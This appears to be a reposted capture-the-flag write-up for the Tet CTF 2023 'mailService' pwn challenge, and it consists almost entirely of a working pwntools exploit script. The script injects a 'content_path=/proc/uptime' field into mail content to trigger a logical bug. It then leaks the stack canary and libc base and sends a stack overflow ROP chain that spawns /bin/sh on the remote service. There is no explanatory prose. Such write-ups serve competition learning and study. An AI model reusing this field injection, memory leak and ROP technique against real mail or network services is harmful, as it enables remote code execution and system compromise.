# [CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN

> 原文: https://www.ctfiot.com/90435.html
> ID: 90435


```
from pwn import *
import random

p = remote('172.17.0.4', 1337)
#p = process('mailclient')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

email = b'xguest' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'
email2 = b'xguest2' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'

#register
p.sendline(b'2'); time.sleep(0.15)
p.sendline(email); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.15)

#register
p.sendline(b'2'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.15)

#login
p.sendline(b'1'); time.sleep(0.15)
p.sendline(email); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.155)

filename1 = b'fisadioada' + str(random.randint(10**10,10**11)).encode()
filename2 = b'asdj09casj' + str(random.randint(10**10,10**11)).encode()

#sent
p.sendline(b'3'); time.sleep(0.155)
p.sendline(email); time.sleep(0.155)
p.sendline(filename1); time.sleep(0.155)
p.sendline(b'2000'); time.sleep(0.155) #2147483648
p.sendline(b'xxxxxxxxxxxx'+b'aaaa;content_path=/proc/uptime\x00'*70); time.sleep(0.155)

p.sendline(b'4')

#sent
p.sendline(b'3'); time.sleep(0.155)
p.sendline(email2); time.sleep(0.15)
p.send(b'\n'); time.sleep(0.155)
p.sendline(b'2'); time.sleep(0.155) #2147483648
p.sendline(b'a'*1); time.sleep(0.155)

#login
p.sendline(b'1'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.155)

p.sendline(b'4')

p.recvuntil(b'Subject: content_path=/proc/uptime\n')
p.recvn(2048+8)
cnry = u64(p.recvn(8))
print(f'cnry : {(hex(cnry))}')

p.recvn(8*7)

libc_base = u64(p.recvn(8)) - 0x29d90
print(f'libc_base : {(hex(libc_base))}')

#sent
p.sendline(b'3'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(filename2); time.sleep(0.15)
p.sendline(b'-1'); time.sleep(0.15)

payload = b'a'*(2048+8)
payload += p64(cnry)
payload += p64(0xdeadbeef)
payload += p64(libc_base + 0x000000000002a3e5)
payload += p64(libc_base + list(libc.search(b'/bin/sh'))[0])
payload += p64(libc_base + 0x000000000002a3e5+1)
payload += p64(libc_base + 0x50d60)
p.sendline(payload); time.sleep(0.15)

p.sendline(b'4'); time.sleep(0.15)

p.interactive()
```
